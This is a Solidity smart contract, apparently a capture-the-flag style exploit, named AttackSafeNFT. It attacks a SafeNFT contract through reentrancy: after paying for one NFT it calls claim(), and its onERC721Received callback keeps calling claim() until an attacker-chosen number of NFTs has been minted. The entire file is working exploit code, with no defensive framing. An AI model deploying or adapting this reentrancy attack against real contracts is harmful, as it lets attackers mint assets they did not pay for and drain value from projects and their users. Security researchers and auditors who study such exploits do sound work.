// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ISafeNFT{
    function buyNFT() external payable ;
    function claim() external;
}

contract AttackSafeNFT is IERC721Receiver {

    ISafeNFT nft;
    bool complete;
    uint256 iter;
    uint256 maxiter;

    constructor(ISafeNFT _nft){
        nft = _nft;
    }

    // Attcker can pass any number of nfts he want to mint.
    function mintAttack(uint256 numOfNFTs) external payable {
        complete = false;
        iter=1;
        maxiter=numOfNFTs;

        nft.buyNFT{value:msg.value}();
        nft.claim();
    }

    function onERC721Received(address, address, uint256, bytes calldata) public virtual override returns (bytes4) {
        if (!complete) {
            iter+=1;
            if (iter==maxiter)  complete = true;
            nft.claim();
        }
        return this.onERC721Received.selector;
    }
}